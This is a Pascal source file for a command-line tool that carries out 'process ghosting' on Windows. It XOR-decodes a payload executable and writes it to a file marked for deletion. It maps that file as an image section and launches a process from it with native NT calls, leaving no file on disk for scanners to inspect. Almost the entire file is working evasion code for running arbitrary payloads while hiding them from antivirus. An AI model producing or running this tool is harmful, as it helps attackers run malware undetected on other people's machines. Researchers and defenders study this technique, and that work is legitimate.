//this is https://github.com/3gstudent/Inject-dll-by-Process-Doppelganging
//or https://github.com/hasherezade/process_doppelganging
//or https://gist.github.com/hfiref0x/a9911a0b70b473281c9da5daea9a177f

//also see https://github.com/jxy-s/herpaderping

//https://github.com/hasherezade/process_ghosting

program NtCreateThread;

uses windows,sysutils, ntdll in '..\ntdll.pas';

var
dummy:dword;



   function CreateFileTransactedW(
                    lpFileName:LPCWSTR;
                      dwDesiredAccess:DWORD;
                      dwShareMode:DWORD;
      lpSecurityAttributes:LPSECURITY_ATTRIBUTES;
                      dwCreationDisposition:DWORD;
                      dwFlagsAndAttributes:DWORD;
                     hTemplateFile:THANDLE;
                     hTransaction:THANDLE;
                    pusMiniVersion:PUSHORT;
                      lpExtendedParameter:PVOID
   ): THANDLE; stdcall; stdcall; external 'kernel32.dll';

   function GetProcessId(Process: THandle): DWORD; stdcall; external 'kernel32.dll' name 'GetProcessId';
   function GetThreadId(Process: THandle): DWORD; stdcall; external 'kernel32.dll' name 'GetThreadId';

   function CreateEnvironmentBlock(
             lpEnvironment:ppvoid;
    hToken:HANDLE;
              bInherit:BOOL):BOOL; stdcall; external 'userenv.dll' ;

   function SetFilePointerEx(hFile: THandle; liDistanceToMove: Int64;
       lpNewFilePointer: PInt64; dwMoveMethod: DWORD): BOOL;
       stdcall; external 'kernel32.dll';

   //function ImageNtHeader(Base: Pointer): PIMAGE_NT_HEADERS; stdcall; external 'dbghelp.dll';

   procedure InitializeObjectAttributes(var p: TObjectAttributes; n:PUNICODE_STRING;
                                             a: ULONG; r: THandle; s: PVOID);
   begin
     p.Length := SizeOf(OBJECT_ATTRIBUTES);
     p.RootDirectory := r;
     p.Attributes := a;
     p.ObjectName := n;
     p.SecurityDescriptor := s;
     p.SecurityQualityOfService := nil;
   end;

   procedure log(msg:string);
   begin
   writeln(msg);
   end;

    function xorfileV3(filein:string;var bufferOut:pointer):dword;
   var
     dwread:dword=0;
     c:dword;
     dwFileSize:dword;
     hfilein:thandle;
     pOut:^byte;
     key:array[0..2] of word=($400,$1000,$4000);
     label fin;
   begin
     //log('********* xorfile **************');
     hFilein := CreateFile(pchar(filein),GENERIC_READ,0,nil,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
     if hFilein=thandle(-1) then exit;
     //
     dwFileSize := GetFileSize(hFilein,nil);
     log('dwFileSize:'+inttostr(dwFileSize));
     if dwFileSize = INVALID_FILE_SIZE then exit;

     bufferOut := AllocMem(dwFileSize);

     ReadFile(hFilein,bufferOut^,dwFileSize,dwRead,nil);
     if (dwread=0) or (dwread<>dwFileSize) then goto fin;
     //xor buffer here
     pOut:=bufferOut;
     for c:=0 to dwread -1 do
       begin
       pOut^ := pOut^ xor (Key[2] shr 8);
       Key[2] := byte(pOut^ + Key[2]) * Key[0] + Key[1];
       inc(pOut);
       end;
     //
     result:=dwFileSize ;

     //
     fin:
     closehandle(hFilein);
     log('XOR OK');
   end;

   function xorfile(filein:string;var buffer:pointer):dword;
var
  dwread:dword=0;
  dwwrite:dword=0;
  c:dword;
  dwFileSize:dword;
  hfilein,hfileout:thandle;
  //buffer:pointer;
  ptr:pbyte;
  label fin;
begin
  //log('********* xorfile **************');
  hFilein := CreateFile(pchar(filein),GENERIC_READ,0,nil,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
  if hFilein=thandle(-1) then exit;
  //
  dwFileSize := GetFileSize(hFilein,nil);
  log('dwFileSize:'+inttostr(dwFileSize));
  if dwFileSize = INVALID_FILE_SIZE then exit;

  buffer := AllocMem(dwFileSize);

  ReadFile(hFilein,buffer^,dwFileSize,dwRead,nil);
  if (dwread=0) or (dwread<>dwFileSize) then goto fin;
  //xor buffer here
  ptr:=buffer;
  for c:=0 to dwread -1 do
    begin
    ptr^:=ptr^ xor 255;
    inc(ptr);
    end;
  //
  result:=dwFileSize ;

  //
  fin:
  closehandle(hFilein);
  log('XOR OK');
end;

   procedure copy_file(source:widestring;destination:handle);
   var
    buffer:pointer;
   bytesread:dword=0;
   byteswritten:dword=0;
   infile:thandle=thandle(-1);
   begin
     if SetFilePointerEx(destination,0,nil,FILE_BEGIN)=false
        then writeln('SetFilePointerEx NOK')
        else writeln('SetFilePointerEx OK');
     infile := CreateFilew(pwidechar(source), GENERIC_READ, 0, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL , 0);
     if infile=thandle(-1) then exit;
     bytesread:=GetFileSize(infile,nil) ;
     writeln('GetFileSize='+inttostr(bytesread));
     if bytesread =0 then exit;
     getmem(buffer,bytesread );
     if readfile(infile,buffer^,bytesread,bytesread,nil)=false then writeln('readfile false');
     writeln('bytesread='+inttostr(bytesread));
     CloseHandle(infile);
     //
     if (WriteFile(destination, Buffer^, bytesread, byteswritten, nil)=false) or (byteswritten=0)
        then writeln('writefile NOK')
        else writeln('writefile OK');
     freemem(buffer);
     FlushFileBuffers(destination);
     writeln('copy_file done');
   end;

   procedure overwrite_file(destination:handle);
   var
   buffer:pointer;
   bytesread:dword=0;
   byteswritten:dword=0;
   total:int64=0;
   size:int64=0;
   begin
     size:=GetFileSize(destination,nil) ;
     writeln('size:'+inttostr(size));
     if SetFilePointerEx(destination,0,nil,FILE_BEGIN)=false
        then writeln('SetFilePointerEx NOK')
        else writeln('SetFilePointerEx OK');
     bytesread:=1024*1024;
     buffer:=AllocMem (bytesread);
     while total<size do
     begin
       if (WriteFile(destination, Buffer^, bytesread, byteswritten, nil)=false) or (byteswritten=0) then break;
       inc(total,byteswritten );
     end;
   freemem(buffer);
   FlushFileBuffers(destination);
   writeln('overwrite_file done');
   end;


   procedure main(targetapp,payload:widestring);
   var

   hprocess :thandle=thandle(-1);
   SectionHandle:thandle=thandle(-1);
   Attrib:OBJECT_ATTRIBUTES;
   ClientId:CLIENT_ID;
   ScectionDataSize:TLargeInteger; //size of the payload

     RemoteThread :thandle=0;
     infile:thandle=thandle(-1);
     outfile:thandle=thandle(-1);
     buffer:pointer=nil;
     temp:array [0..$1000-1] of byte;
     bytesread:dword=0;
     byteswritten:dword=0;
     status:NTSTATUS;
     pbi:PROCESS_BASIC_INFORMATION;
     ReturnLength,numberofbytesread:ulong;
     EntryPoint:nativeuint;
     ntheaders:PIMAGE_NT_HEADERS;
     ImageBaseAddress:nativeuint;
     ustr,udir:UNICODE_STRING ;
     ProcessParameters:PRTL_USER_PROCESS_PARAMETERS=nil;
     MemoryPtr:pvoid=nil;
     peb_:PPEB;
     n:NativeUInt ;
     environment:pvoid;
     status_block:IO_STATUS_BLOCK;
     info:FILE_DISPOSITION_INFORMATION;
   begin
     //if fileexists(targetapp) then exit;

     //***************** lets read the payload
     writeln('****************');
     if (lowercase(ExtractFileExt (payload))<>'.xor') and (lowercase(ExtractFileExt (payload))<>'.encrypted') then
     begin
     infile := CreateFilew(pwidechar(payload), GENERIC_READ, 0, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL , 0);
     if infile=thandle(-1) then exit;
     bytesread:=GetFileSize(infile,nil) ;
     writeln('GetFileSize='+inttostr(bytesread));
     if bytesread =0 then exit;
     getmem(buffer,bytesread );
     if readfile(infile,buffer^,bytesread,bytesread,nil)=false then writeln('readfile false');
     writeln('bytesread='+inttostr(bytesread));
     CloseHandle(infile);
     ScectionDataSize  :=bytesread;
     end
     else
     ScectionDataSize:=xorfilev3(payload,buffer);



     //************** lets create a target file
     writeln('****************');
     writeln('targetapp:'+(targetapp));
     //STANDARD_RIGHTS_ALL : Combines DELETE, READ_CONTROL, WRITE_DAC, WRITE_OWNER, and SYNCHRONIZE access
     //more here https://gist.github.com/Rhomboid/0cf96d7c82991af44fda
     outfile := CreateFilew(pwidechar(targetapp), STANDARD_RIGHTS_ALL or generic_read or generic_write,0, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL , 0);
     if outfile=thandle(-1) then exit;

     //file will be deleted when handle will be close, i.e after the createsection
     ZeroMemory(@status_block,sizeof(status_block));
     ZeroMemory(@info,sizeof(info));
     info.DeleteFile := TRUE;
     status := NtSetInformationFile(outfile, @status_block, @info, sizeof(info), FileDispositionInformation);
     writeln('NtSetInformationFile:'+inttohex(status,sizeof(status)));
     //0xC0000022 STATUS_ACCESS_DENIED
     //

     if WriteFile(outfile, Buffer^, ScectionDataSize, byteswritten, nil) =false then
                 begin
                 writeln('WriteFile failed');
                 exit;
                 end
                 else writeln('byteswritten:'+inttostr(byteswritten));


     //************* lets create a section against this transacted file
     writeln('****************');
     //in a normal life we would pass the handle to the file rather than hTransactedFile
     status:=NtCreateSection(@SectionHandle,SECTION_ALL_ACCESS,nil,nil,PAGE_READONLY,SEC_IMAGE,outfile);
     //status:=NtCreateSection(@SectionHandle, $E, nil, @ScectionDataSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, nil );
     writeln('NtCreateSection:'+inttohex(status,sizeof(status)));
     closehandle(outfile); //we no longer need the handle to outfile since it is cached in the section
     if SectionHandle <=0 then exit;
     if status<>0 then exit;
     //

     //************** lets create the process from the section
     writeln('****************');
             ZeroMemory(@hprocess,sizeof(hprocess));
             //
             {
             InitializeObjectAttributes(Attrib ,nil,0,0,nil);
             RtlInitUnicodeString(@ustr , pwstr(targetapp ));
             attrib.ObjectName :=@ustr;
             attrib.Attributes := $00000002; //OBJ_INHERIT  00000040
             }
             //
             status := NtCreateProcessEx(@hProcess,
                 PROCESS_ALL_ACCESS,
                 nil, //@attrib
                 ntCurrentProcess,
                 PS_INHERIT_HANDLES,
                 SectionHandle,
                 0,
                 0,
                 FALSE);

             writeln('NtCreateProcessEx:'+inttohex(status,sizeof(status)));
             if status<>0 then exit;
             writeln('pid:'+inttostr(GetProcessID(hProcess)));
     //readln;
     //
     NtClose( SectionHandle );

     //
     //https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55
     //C0000024 STATUS_OBJECT_TYPE_MISMATCH
     //C0000049	STATUS_SECTION_NOT_IMAGE
     //C0000020	STATUS_INVALID_FILE_FOR_SECTION

     // **************** lets get the entry point
     writeln('****************');
     fillchar(pbi,sizeof(pbi),0);
     status := NtQueryInformationProcess(hProcess,ProcessBasicInformation,@pbi,sizeof(PROCESS_BASIC_INFORMATION),@ReturnLength);
     writeln('NtQueryInformationProcess:'+inttohex(status,sizeof(status)));
     if status<>0 then exit;
     writeln('PebBaseAddress:'+inttohex(nativeuint(pbi.PebBaseAddress),sizeof(pointer)));
     writeln('UniqueProcessId:'+inttostr(pbi.UniqueProcessId)) ;

      //getmem(buffer,$1000);
      fillchar(temp,sizeof(temp),0);
      //status:=NtReadVirtualMemory(hProcess, (pbi.PebBaseAddress), @temp[0], $1000, @numberofbytesread );
      //https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/pebteb/peb/index.htm
      status:=NtReadVirtualMemory(hProcess, pointer(nativeuint(pbi.PebBaseAddress)+$10), @ImageBaseAddress, sizeof(pvoid), @numberofbytesread );
      //if ReadProcessMemory (hprocess,pbi.PebBaseAddress ,@temp[0],$1000,@numberofbytesread )=true then status:=0;
      writeln('NtReadVirtualMemory:'+inttohex(status,sizeof(status)));
      writeln('ImageBaseAddress:'+inttohex(ImageBaseAddress,sizeof(ImageBaseAddress)));
      //writeln('numberofbytesread:'+inttostr(numberofbytesread));
      if status<>0 then exit;

      ntheaders:=RtlImageNtHeader(Buffer);

      //writeln(inttohex(nativeuint(ntheaders),sizeof(pointer))) ;
      EntryPoint := ntheaders^.OptionalHeader.AddressOfEntryPoint;
      writeln('EntryPoint:'+inttohex(EntryPoint,sizeof(EntryPoint)));
      EntryPoint := EntryPoint + ImageBaseAddress;
      writeln('EntryPoint:'+inttohex(EntryPoint,sizeof(EntryPoint)));

      //*********** Allocate memory in target process and write process parameters block.
      //CreateEnvironmentBlock(@environment, 0, TRUE);
      writeln('****************');
      RtlInitUnicodeString(@ustr, pwstr(targetapp )); //whatever you want here
      RtlInitUnicodeString(@udir, pwstr('c:\windows\system32' )); //whatever you want here
      writeln('targetapp:'+strpas(ustr.Buffer) );
      //zeromemory(ProcessParameters,sizeof(ProcessParameters));
        status := RtlCreateProcessParametersEx(@ProcessParameters,
            @ustr, //image path name
            @udir,
            @udir,
            @ustr, //command line
            nil, //environment
            nil,
            nil,
            nil,
            nil,
            {0} RTL_USER_PROC_PARAMS_NORMALIZED); //offset vs pointers
      writeln('RtlCreateProcessParametersEx:'+inttohex(status,sizeof(status)));
      writeln('ProcessParameters:'+inttohex(nativeuint(ProcessParameters),sizeof(nativeuint)));
      try
        writeln('CommandLine:'+strpas(ProcessParameters^.CommandLine.Buffer  ))  ;
        writeln('ImagePathName:'+strpas(ProcessParameters^.ImagePathName.Buffer  ))  ;
      except
      end;

      writeln('****************');

      numberofbytesread := ProcessParameters^.EnvironmentSize + ProcessParameters^.MaximumLength;
      numberofbytesread:=align(numberofbytesread,$1000);
      writeln('numberofbytesread:'+inttostr(numberofbytesread));

      MemoryPtr := ProcessParameters;
      writeln('MemoryPtr:'+inttohex(nativeuint(MemoryPtr),sizeof(nativeuint)));

      status := NtAllocateVirtualMemory(hProcess,@MemoryPtr,0,@numberofbytesread,MEM_RESERVE or MEM_COMMIT,PAGE_READWRITE);
      writeln('NtAllocateVirtualMemory:'+inttohex(status,sizeof(status)));
      writeln('ProcessParameters:'+inttohex(nativeuint(ProcessParameters),sizeof(nativeuint)));
      numberofbytesread := 0;
      status := NtWriteVirtualMemory(hProcess,ProcessParameters,ProcessParameters,ProcessParameters^.EnvironmentSize + ProcessParameters^.MaximumLength,@numberofbytesread );
      //or
      //status := NtWriteVirtualMemory(hProcess,MemoryPtr,ProcessParameters,ProcessParameters^.EnvironmentSize + ProcessParameters^.MaximumLength,@numberofbytesread );
      writeln('NtWriteVirtualMemory:'+inttohex(status,sizeof(status)));
      writeln('numberofbytesread:'+inttostr(numberofbytesread));
      //0x8000000D   STATUS_PARTIAL_COPY


      //************Update PEB->ProcessParameters pointer to newly allocated block.

      //Peb_ := pbi.PebBaseAddress;
      //writeln('Peb:'+inttohex(nativeuint(Peb),sizeof(pointer)));
      n:=nativeuint(ProcessParameters );
      //n:=nativeuint(addr(MemoryPtr));
      //writeln('MemoryPtr:'+inttohex(nativeuint(addr(MemoryPtr)),sizeof(n)));
      numberofbytesread := 0;
      //status:=NtWriteVirtualMemory(hProcess,pointer(nativeuint(pbi.PebBaseAddress)+$20),ProcessParameters,sizeof(PVOID),@numberofbytesread);
      //or
      status:=NtWriteVirtualMemory(hProcess,pointer(nativeuint(pbi.PebBaseAddress)+$20),@n,sizeof(PVOID),@numberofbytesread);
      writeln('NtWriteVirtualMemory:'+inttohex(status,sizeof(status)));
      writeln('numberofbytesread:'+inttostr(numberofbytesread));
      //check memory
      //status:=NtReadVirtualMemory(hProcess, pointer(nativeuint(pbi.PebBaseAddress)+$20), @n, sizeof(pvoid), @numberofbytesread );
      //writeln('n:'+inttohex(nativeuint(n ),sizeof(n)));
      //
      //
      //status:= NtSetInformationProcess(hprocess,ProcessImageFileName,@ustr,sizeof(ustr));
      //writeln('NtSetInformationProcess:'+inttohex(status,sizeof(status)));
      //fails with 0xC0000003, STATUS_INVALID_INFO_CLASS
      RtlInitUnicodeString(@ustr, pwstr(targetapp ));
      status:=NtqueryInformationProcess(hprocess ,ProcessImageFileName ,@ustr,sizeof(ustr),@ReturnLength);
      writeln('NtqueryInformationProcess:'+inttohex(status,sizeof(status))+' '+inttostr(ReturnLength));
      writeln('ProcessImageFileName:'+strpas(ustr.Buffer) ); //will be empty :(
      status:=RtlDestroyProcessParameters(ProcessParameters);
      writeln('RtlDestroyProcessParameters:'+inttohex(status,sizeof(status)));
      //readln;

      //
      writeln('****************');
      RemoteThread := 0;
        status := NtCreateThreadEx(@RemoteThread,
            THREAD_ALL_ACCESS,
            nil,
            hProcess,
            pointer(EntryPoint),
            nil,
            FALSE,
            0,
            nil,
            nil,
            nil);
        writeln('NtCreateThreadEx:'+inttohex(status,sizeof(status)));
        writeln('RemoteThread:'+inttostr(GetThreadId(RemoteThread)));
      //






     //readln;
   end;

begin
  writeln('process_ghosting');
  writeln('ntcreatethreadex.exe targetapp payload');
  if paramcount<2 then exit;
  main(paramstr(1),paramstr(2));
end.

